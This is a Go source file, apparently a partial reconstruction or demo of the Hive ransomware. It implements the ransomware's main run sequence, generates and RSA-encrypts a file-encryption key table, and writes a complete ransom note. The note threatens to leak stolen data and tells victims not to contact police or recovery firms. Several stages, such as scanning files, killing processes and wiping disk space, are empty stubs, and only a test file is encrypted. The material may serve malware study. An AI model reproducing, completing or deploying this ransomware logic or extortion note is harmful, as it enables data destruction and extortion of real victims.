package hive


import (
  "runtime"
  "os"
  "time"
  mathrand "math/rand"
  "crypto/x509"
  "crypto/rsa"
  "encoding/base64"
  "regexp"
  "hive_demo/keytab"
  "hive_demo/config"
)


// HiveContext structure
type HiveContext struct {
  KeyTab *keytab.EncryptionKeyTab
  RansomExt string
  RansomNoteName string
  RansomNote string
  FileSkipList string
  SkipWipe bool
  NumThreads int
  CmdArgs []string
  FileSkipRegexp *regexp.Regexp
  SkipRegexp *regexp.Regexp
  EncSkipRegexp *regexp.Regexp
  ServiceStopList string
  ProcessKillList string
  GrantPermissions bool
  ProcessKillRegexp *regexp.Regexp
  ServiceStopRegexp *regexp.Regexp
}


// Hive main function
func (ctx *HiveContext) RunProcess() {

  // Hive initialization
  ctx.Init()

  // Export key table
  ctx.ExportKey()

  // Stop services, kill processes. grant permissions
  ctx.Preprocess()

  ctx.PreNotify()

  // Scan files
  ctx.ScanFiles()

  // Encrypt files
  ctx.EncryptFiles()

  // Erase key
  ctx.EraseKey()

  ctx.Notify()

  // Wipe spaces
  ctx.WipeSpaces()

  ctx.Postprocess()
}


// Hive initialization
func (ctx *HiveContext) Init() {

  mathrand.Seed(time.Now().UnixNano())

  // Generate key table
  ctx.KeyTab = keytab.GenKeyTab()

  // Compile regexps
  ctx.ServiceStopRegexp, _ = regexp.Compile("(?i:" +
                                            ctx.ServiceStopList +
                                            ")")
  ctx.ProcessKillRegexp, _ = regexp.Compile("(?i:" +
                                            ctx.ProcessKillList +
                                            ")")

  if ctx.FileSkipList == "" {
    ctx.FileSkipList = "^$"
  }

  ctx.NumThreads = 192
  if runtime.NumCPU() < 6 {
    ctx.NumThreads = 10
  }

  ctx.RansomExt = config.RansomExt()

  ctx.RansomNoteName = config.RansomNoteName()

  ctx.EncSkipRegexp = regexp.MustCompile("(.+)\\.(.+?)\\." +
                                         config.RansomExt() +
                                         "$")

  ctx.RansomNote =
    "Your network has been breached and all data were encrypted.\r\n" +
    "Personal data, financial reports and important documents are ready to disclose.\r\n" +
    "\r\n" +
    "To decrypt all the data and to prevent exfiltrated files to be disclosed at \r\n" +
    config.DLSUrl() + "\r\n" +
    "you will need to purchase our decryption software.\r\n" +
    "\r\n" +
    "Please contact our sales department at:\r\n" +
    "\r\n" +
    "   " + config.SalesDeptUrl() + "\r\n" +
    "  \r\n" +
    "      Login:    " + config.Login() + "\r\n" +
    "      Password: " + config.Password() + "\r\n" +
    "\r\n" +
    "To get an access to .onion websites download and install Tor Browser at:\r\n" +
    "   https://www.torproject.org/ (Tor Browser is not related to us)\r\n" +
    "\r\n" +
    "\r\n" +
    "Follow the guidelines below to avoid losing your data:\r\n" +
    "\r\n" +
    " - Do not modify, rename or delete *.key." + config.RansomExt() +
    " files. Your data will be \r\n" +
    "   undecryptable.\r\n" +
    " - Do not modify or rename encrypted files. You will lose them.\r\n" +
    " - Do not report to the Police, FBI, etc. They don't care about your business.\r\n" +
    "   They simply won't allow you to pay. As a result you will lose everything.\r\n" +
    " - Do not hire a recovery company. They can't decrypt without the key. \r\n" +
    "   They also don't care about your business. They believe that they are \r\n" +
    "   good negotiators, but it is not. They usually fail. So speak for yourself.\r\n" +
    " - Do not reject to purchase. Exfiltrated files will be publicly disclosed.\r\n"
}


// Export key table
func (ctx *HiveContext) ExportKey() {

  // Import RSA public keys
  pubkeys := ImportRSAPubKeys()

  // Encrypt key table
  enc_keytab := ctx.KeyTab.Export(pubkeys)

  key_name_data := append(ctx.KeyTab.Hash, 0xFF)

  key_name := base64.URLEncoding.EncodeToString(key_name_data)

  key_filename := key_name + ".key." + ctx.RansomExt

  // Save encrypted key table to file
  f, _ := os.OpenFile(key_filename, os.O_RDWR | os.O_CREATE | os.O_TRUNC,
                      0666)

  defer f.Close()

  f.Write(enc_keytab)
}


// Stop services, kill processes. grant permissions
func (ctx *HiveContext) Preprocess() {
  // StopServices

  // KillProcesses

  // GrantPermissions
}


func (ctx *HiveContext) PreNotify() {
  // ...
}



// Scan files
func (ctx *HiveContext) ScanFiles() {
  // ...
}


// Encrypt files
func (ctx *HiveContext) EncryptFiles() {

  // Encrypt file
  ctx.KeyTab.EncryptFilename("test.dat", ctx.RansomExt)
}


// Erase key
func (ctx *HiveContext) EraseKey() {
  // Erase key table
  ctx.KeyTab.Erase()
}


func (ctx *HiveContext) Notify() {

  // Save ransom note
  ransom_note_path := ctx.RansomNoteName

  if _, err := os.Stat(ransom_note_path); !os.IsNotExist(err) {
    return
  }

  f, _ := os.OpenFile(ransom_note_path, os.O_RDWR | os.O_CREATE | os.O_TRUNC,
                      0666)

  defer f.Close()

  f.Write([]byte(ctx.RansomNote))
}


// Wipe spaces
func (ctx *HiveContext) WipeSpaces() {
}


func (ctx *HiveContext) Postprocess() {
}


// Import RSA public keys
func ImportRSAPubKeys() []*rsa.PublicKey {

  var pubkeys []*rsa.PublicKey

  for i := 0; i < len(config.RSAPubKeyDerDataList); i++ {

    pubkey, _ := x509.ParsePKCS1PublicKey(config.RSAPubKeyDerDataList[i])

    pubkeys = append(pubkeys, pubkey)
  }

  return pubkeys
}
